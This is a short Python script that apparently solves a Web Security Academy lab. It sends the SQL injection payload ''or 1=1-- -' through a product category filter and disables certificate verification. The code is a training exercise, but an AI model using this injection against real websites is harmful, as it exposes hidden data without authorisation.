import requests
import bs4
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) #suppress warning about making insecure https requests


def getNumberOfReleasedProducts(text):
    soup=bs4.BeautifulSoup(text,'html.parser')
    i=0
    res=soup.find('section',attrs={'class','container-list-tiles'})
    product_divs = res.find_all('div', recursive=False)
    return len(product_divs)


def main():
    host="https://0ac1009e04d4f3cb8199c552008700cd.web-security-academy.net"
    initial_number_of_products=getNumberOfReleasedProducts(requests.get(host).text)
    client=requests.Session()
    client.verify=False
    payload="'or 1=1-- -"
    url=f'{host}/filter?category={payload}'
    request=client.get(url)
    if getNumberOfReleasedProducts(client.get(url).text) >initial_number_of_products:
        print(f'[+] Lab Solved LESSGOOOOO')
    else:
        print(f'Try harder noob!')
    
if __name__=="__main__":
    main()
